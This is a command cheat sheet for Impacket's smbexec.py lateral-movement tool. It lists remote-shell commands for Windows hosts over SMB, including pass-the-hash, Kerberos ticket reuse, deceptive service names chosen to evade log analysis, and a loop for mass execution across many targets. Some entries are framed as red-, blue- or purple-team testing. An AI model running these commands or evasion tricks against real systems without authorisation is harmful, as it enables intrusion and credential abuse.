# smbexec

> Impacket’s smbexec.py: a semi-interactive shell over SMB that creates a service per command instead of uploading a binary.

- Category: Lateral Movement
- Commands: 45
- Page: https://terminal.rokibulroni.com/tool/lateral/smbexec
- Homepage: https://github.com/fortra/impacket
- Documentation: https://github.com/fortra/impacket
- Tags: remote execution, SMB, Impacket

## Install

- apt: `sudo apt install python3-impacket`
- pipx: `pipx install impacket`

## Basic Remote Execution

### smbexec.py administrator:password@192.168.1.10

```bash
smbexec.py administrator:password@192.168.1.10
```

Example:

```bash
smbexec.py administrator:Summer2025!@192.168.1.10
```

Executes a semi-interactive shell on a remote Windows host using local credentials.

### smbexec.py domain/administrator:password@192.168.1.10

```bash
smbexec.py domain/administrator:password@192.168.1.10
```

Example:

```bash
smbexec.py corp.local/admin:P@ssword123@192.168.1.10
```

Connects to a target using domain credentials.

### smbexec.py domain/user:password@hostname

```bash
smbexec.py domain/user:password@hostname
```

Example:

```bash
smbexec.py corp/jdoe:secret@fileserver01
```

Targets a host by hostname instead of IP address.


## NTLM Hash Authentication

### smbexec.py -hashes :<NTHash> administrator@192.168.1.10

```bash
smbexec.py -hashes :<NTHash> administrator@192.168.1.10
```

Example:

```bash
smbexec.py -hashes :8846F7EAEE8FB117AD06BDD830B7586C administrator@192.168.1.10
```

Performs Pass-the-Hash authentication using only the NT hash.

### smbexec.py -hashes <LMHash>:<NTHash> administrator@192.168.1.10

```bash
smbexec.py -hashes <LMHash>:<NTHash> administrator@192.168.1.10
```

Example:

```bash
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C administrator@192.168.1.10
```

Performs Pass-the-Hash using both LM and NT hashes.


## Authentication Handling

### smbexec.py -no-pass administrator@192.168.1.10

```bash
smbexec.py -no-pass administrator@192.168.1.10
```

Attempts to connect without a password, useful if a null session or existing trust allows it.


## Kerberos Authentication

### smbexec.py -k -no-pass target.domain.local

```bash
smbexec.py -k -no-pass target.domain.local
```

Example:

```bash
smbexec.py -k -no-pass file01.corp.local
```

Uses an existing TGT from the KRB5CCNAME environment variable for Kerberos authentication.

### smbexec.py -k -no-pass -dc-ip <DC_IP> target.domain.local

```bash
smbexec.py -k -no-pass -dc-ip <DC_IP> target.domain.local
```

Example:

```bash
smbexec.py -k -no-pass -dc-ip 192.168.1.5 file01.corp.local
```

Authenticates via Kerberos while manually specifying the Domain Controller IP.

### smbexec.py -aesKey <hex_key> user@192.168.1.10

```bash
smbexec.py -aesKey <hex_key> user@192.168.1.10
```

Example:

```bash
smbexec.py -aesKey 8e5f...9a1b administrator@192.168.1.10
```

Authenticates using the AES256 key for Kerberos instead of a password or NTLM hash.


## Service Customization

### smbexec.py -service-name <name> administrator@192.168.1.10

```bash
smbexec.py -service-name <name> administrator@192.168.1.10
```

Example:

```bash
smbexec.py -service-name UpdaterService administrator@192.168.1.10
```

Sets a custom name for the service created on the remote host to blend in.


## Execution Mode

### smbexec.py -mode SHARE administrator@192.168.1.10

```bash
smbexec.py -mode SHARE administrator@192.168.1.10
```

Forces SHARE mode where output is written to a remote share file and read back.

### smbexec.py -mode SERVER administrator@192.168.1.10

```bash
smbexec.py -mode SERVER administrator@192.168.1.10
```

Forces SERVER mode where a local SMB server is raised to receive command output.

### smbexec.py -share <share_name> administrator@192.168.1.10

```bash
smbexec.py -share <share_name> administrator@192.168.1.10
```

Example:

```bash
smbexec.py -share ADMIN$ administrator@192.168.1.10
```

Specifies a specific share (e.g., ADMIN$ or C$) to use for uploading the service executable.


## Target Specification

### smbexec.py -target-ip <ip> domain/user@hostname

```bash
smbexec.py -target-ip <ip> domain/user@hostname
```

Example:

```bash
smbexec.py -target-ip 192.168.1.20 corp/admin@ws-hr-01
```

Resolves the hostname manually to a specific target IP address.

### smbexec.py -port 445 administrator@192.168.1.10

```bash
smbexec.py -port 445 administrator@192.168.1.10
```

Explicitly sets the destination port, useful if port forwarding or non-standard ports are in use.


## Output and Debugging

### smbexec.py -debug administrator@192.168.1.10

```bash
smbexec.py -debug administrator@192.168.1.10
```

Enables verbose debug output to troubleshoot connection or authentication issues.

### smbexec.py -codec <codec_name> administrator@192.168.1.10

```bash
smbexec.py -codec <codec_name> administrator@192.168.1.10
```

Example:

```bash
smbexec.py -codec utf-8 administrator@192.168.1.10
```

Sets the text encoding used for the remote output to handle non-ASCII characters.


## Advanced Authentication

### smbexec.py -k -debug target.local

```bash
smbexec.py -k -debug target.local
```

Example:

```bash
smbexec.py -k -debug database.corp.local
```

Combines Kerberos authentication with debug mode to diagnose ticket issues.


## Lateral Movement Simulation

### smbexec.py -hashes :<NTHash> -service-name BTO_Service admin@192.168.1.10

```bash
smbexec.py -hashes :<NTHash> -service-name BTO_Service admin@192.168.1.10
```

Example:

```bash
smbexec.py -hashes :8846... admin@192.168.1.10 -service-name SVC_BACKUP
```

Simulates lateral movement using a hash and a custom service name to test detection logic.


## Red Team Operations

### smbexec.py -mode SERVER -service-name WinDefendUpdate admin@192.168.1.10

```bash
smbexec.py -mode SERVER -service-name WinDefendUpdate admin@192.168.1.10
```

Uses Server mode and a deceptive service name to evade simple log analysis.

### smbexec.py -share C$ -service-name NetLogonHelper admin@192.168.1.10

```bash
smbexec.py -share C$ -service-name NetLogonHelper admin@192.168.1.10
```

Executes via the C$ share instead of ADMIN$ with a legitimate-sounding service name.


## Blue Team Validation

### smbexec.py -debug -service-name TEST_LATERAL_MOVE admin@192.168.1.10

```bash
smbexec.py -debug -service-name TEST_LATERAL_MOVE admin@192.168.1.10
```

Generates a noisy, easily identifiable service creation event for verifying SIEM alerts.

### smbexec.py -k -no-pass -service-name KRB_TEST target.local

```bash
smbexec.py -k -no-pass -service-name KRB_TEST target.local
```

Example:

```bash
smbexec.py -k -no-pass -service-name KRB_TEST file01.local
```

Tests detection rules for Kerberos-based service creation lateral movement.


## Complex Workflow

### smbexec.py -hashes :<NTHash> -dc-ip <DC_IP> domain/user@target_ip

```bash
smbexec.py -hashes :<NTHash> -dc-ip <DC_IP> domain/user@target_ip
```

Example:

```bash
smbexec.py -hashes :8846... -dc-ip 10.0.0.5 corp/admin@10.0.0.20
```

Authenticates to a specific target IP while directing authentication requests to a specific DC.

### smbexec.py -mode SHARE -share IPC$ admin@192.168.1.10

```bash
smbexec.py -mode SHARE -share IPC$ admin@192.168.1.10
```

Attempts execution using the IPC$ share, often used to test restricted share access controls.


## Legacy/Compatibility

### smbexec.py -port 139 administrator@192.168.1.10

```bash
smbexec.py -port 139 administrator@192.168.1.10
```

Attempts to connect over the legacy NetBIOS Session Service port instead of port 445.


## Purple Team Validation

### smbexec.py -service-name AE_SVC_RANDOM admin@192.168.1.10

```bash
smbexec.py -service-name AE_SVC_RANDOM admin@192.168.1.10
```

Example:

```bash
smbexec.py -service-name AE_SVC_x892a admin@192.168.1.10
```

Emulates an adversary using randomized service names to bypass static string detection.


## Privileged Access

### smbexec.py 'domain/Administrator':password@192.168.1.10

```bash
smbexec.py 'domain/Administrator':password@192.168.1.10
```

Example:

```bash
smbexec.py 'corp/Administrator':Summer2025!@192.168.1.10
```

Explicitly quotes the username to handle spaces or special characters in credentials.


## Incident Response Simulation

### smbexec.py -debug -service-name MALICIOUS_SERVICE admin@192.168.1.10

```bash
smbexec.py -debug -service-name MALICIOUS_SERVICE admin@192.168.1.10
```

Creates a distinct artifact to test the incident response team's ability to extract service binaries.


## Network Evasion

### smbexec.py -mode SERVER -port 445 admin@192.168.1.10

```bash
smbexec.py -mode SERVER -port 445 admin@192.168.1.10
```

Uses server mode to force the target to connect back to the attacker, altering traffic flow patterns.


## Automation Workflow

### smbexec.py -no-pass -k target.local < commands.txt

```bash
smbexec.py -no-pass -k target.local < commands.txt
```

Pipes a list of commands into the standard input for automated execution upon connection.


## Troubleshooting

### smbexec.py -debug -hashes :<NTHash> admin@192.168.1.10

```bash
smbexec.py -debug -hashes :<NTHash> admin@192.168.1.10
```

Example:

```bash
smbexec.py -debug -hashes :8846... admin@192.168.1.10
```

Debugs a Pass-the-Hash connection to verify protocol negotiation and authentication steps.


## Advanced Target Specification

### smbexec.py domain/user:pass@192.168.1.10

```bash
smbexec.py domain/user:pass@192.168.1.10
```

Example:

```bash
smbexec.py corp/jdoe:P@ssword@192.168.1.10
```

Standard syntax for domain authentication against an IP address target.

### smbexec.py localaccount:pass@192.168.1.10

```bash
smbexec.py localaccount:pass@192.168.1.10
```

Example:

```bash
smbexec.py Administrator:P@ssword@192.168.1.10
```

Authenticates using a local account (non-domain) on the remote machine.


## Interactive Handling

### smbexec.py admin:pass@192.168.1.10

```bash
smbexec.py admin:pass@192.168.1.10
```

Upon successful connection, smbexec drops into a semi-interactive CMD.EXE shell.


## Service Cleanup Check

### smbexec.py -service-name TEMP_SVC admin@192.168.1.10

```bash
smbexec.py -service-name TEMP_SVC admin@192.168.1.10
```

Used to verify that the tool correctly deletes the service 'TEMP_SVC' after the session exits.


## Blind Execution

### smbexec.py -mode SHARE -no-pass -k target.local

```bash
smbexec.py -mode SHARE -no-pass -k target.local
```

Example:

```bash
smbexec.py -mode SHARE -no-pass -k db-prod.local
```

Uses Kerberos and Share mode for environments where direct server callbacks are blocked by firewalls.


## Cross-Forest

### smbexec.py child.root.local/admin:pass@rootdc.root.local

```bash
smbexec.py child.root.local/admin:pass@rootdc.root.local
```

Example:

```bash
smbexec.py us.corp.local/admin:pass@uk.corp.local
```

Demonstrates lateral movement across trust boundaries using explicit domain credentials.


## Detection Evasion

### smbexec.py -service-name '' admin@192.168.1.10

```bash
smbexec.py -service-name '' admin@192.168.1.10
```

Attempts to execute with an empty service name to test robustness of parser and logging (may fail on some versions).


## Full Stealth Simulation

### smbexec.py -k -no-pass -mode SERVER -service-name MS_Update admin@target

```bash
smbexec.py -k -no-pass -mode SERVER -service-name MS_Update admin@target
```

Example:

```bash
smbexec.py -k -no-pass -mode SERVER -service-name MS_Update admin@ws01.local
```

Maximizes stealth by combining Kerberos (no NTLM), Server mode (no share drop), and a deceptive name.


## Key-Based Auth

### smbexec.py -aesKey <key> -dc-ip <IP> user@target

```bash
smbexec.py -aesKey <key> -dc-ip <IP> user@target
```

Example:

```bash
smbexec.py -aesKey 8846... -dc-ip 10.10.10.1 administrator@10.10.10.5
```

Uses AES keys for authentication while pinning the DC to avoid DNS poisoning or spoofing.


## Prompt Handling

### smbexec.py admin@192.168.1.10

```bash
smbexec.py admin@192.168.1.10
```

If the password is omitted in the command line, smbexec will securely prompt for it.


## Hash Formats

### smbexec.py -hashes LM:NT domain/user@ip

```bash
smbexec.py -hashes LM:NT domain/user@ip
```

Example:

```bash
smbexec.py -hashes aad3...:8846... corp/user@192.168.1.50
```

Standard syntax for passing full LM:NT hash pairs for domain accounts.


## Mass Execution Scripting

### for ip in $(cat targets.txt); do smbexec.py admin:pass@$ip; done

```bash
for ip in $(cat targets.txt); do smbexec.py admin:pass@$ip; done
```

Conceptual bash loop demonstrating how smbexec is wrapped for mass lateral movement.


## Exit Behavior

### exit

```bash
exit
```

Typing exit inside the smbexec shell terminates the remote service and cleans up the binary.

## Related tools

- [PsExec](https://terminal.rokibulroni.com/tool/lateral/psexec)
- [wmiexec](https://terminal.rokibulroni.com/tool/lateral/wmiexec)
